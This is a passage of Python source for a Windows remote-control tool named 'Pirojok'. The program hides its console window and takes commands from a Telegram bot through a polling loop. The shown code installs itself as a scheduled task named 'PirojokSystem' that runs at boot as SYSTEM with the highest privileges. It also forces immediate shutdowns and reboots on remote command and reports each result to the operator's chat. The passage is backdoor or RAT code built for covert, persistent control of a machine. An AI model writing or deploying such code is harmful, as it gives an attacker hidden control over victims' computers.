            if text == "task_startup" and self.admin_mode:
                if getattr(sys, 'frozen', False):
                    exe_path = sys.executable
                else:
                    exe_path = os.path.abspath(__file__)
                try:
                    task_name = "PirojokSystem"
                    cmd = ['schtasks', '/create', '/tn', task_name, '/tr', f'"{exe_path}"',
                           '/sc', 'onstart', '/ru', 'SYSTEM', '/rl', 'highest', '/f']
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0:
                        self.send_message(chat_id, "[OK] Added to task scheduler (system)")
                    else:
                        self.send_message(chat_id, f"[ERROR] {result.stderr}")
                except Exception as e:
                    self.send_message(chat_id, f"[ERROR] {e}")
                self.processing = False
                return
            
            if text == "startup_remove_all":
                result = self.remove_all_startup()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "startup_check":
                result = self.check_startup()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            # === POWER ===
            if text == "shutdown_now":
                os.system("shutdown /s /f /t 0")
                self.send_message(chat_id, "[SHUTDOWN] Shutting down NOW!")
                self.processing = False
                return
            
            if text == "reboot_now":
                os.system("shutdown /r /f /t 0")
                self.send_message(chat_id, "[REBOOT] Rebooting NOW!")
                self.processing = False
                return
            
            if text == "shutdown":
                os.system("shutdown /s /t 5")
                self.send_message(chat_id, "[SHUTDOWN] Shutting down in 5 seconds...")
                self.processing = False
                return
            
            if text == "reboot":
                os.system("shutdown /r /t 5")
                self.send_message(chat_id, "[REBOOT] Rebooting in 5 seconds...")
                self.processing = False
                return
            
            if text == "abort":
                os.system("shutdown /a")
                self.send_message(chat_id, "[ABORT] Shutdown aborted")
                self.processing = False
                return
            
            self.send_message(chat_id, f"[ERROR] Unknown command: '{text}'. Use help")
            self.processing = False
        except Exception as e:
            print(f"Error: {e}")
            self.processing = False
    
    def main_loop(self):
        self.on_system_startup()
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {"offset": self.last_update_id + 1, "timeout": 30, "allowed_updates": ["message"]}
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(target=self.process_command,
                                args=(update["message"]["text"], update["message"]["chat"]["id"]))
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "[PIROJOK] Stopped")

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    pirojok = Pirojok()
    pirojok.run()
